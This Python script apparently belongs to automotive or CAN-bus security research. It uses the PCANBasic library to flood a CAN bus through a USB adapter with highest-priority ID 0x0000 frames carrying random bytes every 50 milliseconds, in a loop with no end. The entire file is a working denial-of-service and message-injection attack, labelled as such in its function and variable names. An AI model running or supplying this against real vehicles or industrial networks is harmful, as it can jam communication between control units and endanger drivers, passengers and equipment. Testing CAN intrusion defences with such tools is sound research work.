from PCANBasic import *
import random
import time
import datetime
from os import walk

def DoS_Attack(id, leng, data):
    all_datas = ""
    Fuzzing_ID = int(id, 16)

    DoS_DATA = TPCANMsg()
    DoS_DATA.ID = Fuzzing_ID
    DoS_DATA.LEN = len(data)
    DoS_DATA.MSGTYPE = PCAN_MESSAGE_STANDARD
    
    all_datas += str(DoS_DATA.ID) + "\t" + str(DoS_DATA.LEN) + "\t"
    
    for i in range(leng):
        DoS_DATA.DATA[i] = int(data[i], 16)
        all_datas += str(DoS_DATA.DATA[i]) + "\t"

    print(all_datas)
    CAN.Write(CAN_BUS, DoS_DATA)

if __name__ == "__main__":
    CAN = PCANBasic()                            #CANi
    CAN_BUS = PCAN_USBBUS1
    counter = 0    
    start_time = time.time()
    ind = 0
    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    if result != PCAN_ERROR_OK:
        # An error occurred, get a text describing the error and show it
        #
        print("oh No")
        CAN.GetErrorText(result)
        print(result)
    id_exist = False

    while True:
        # time_offset = random.randrange(1, 50) / 1000
        time_offset = 0.05
        injection_id = "0000"
        attack_data = []
        leng = random.randrange(1, 8)
        for _ in range(leng):
            attack_data.append(hex(random.randrange(0, 255)))
        DoS_Attack(injection_id, leng, attack_data)
        time.sleep(time_offset)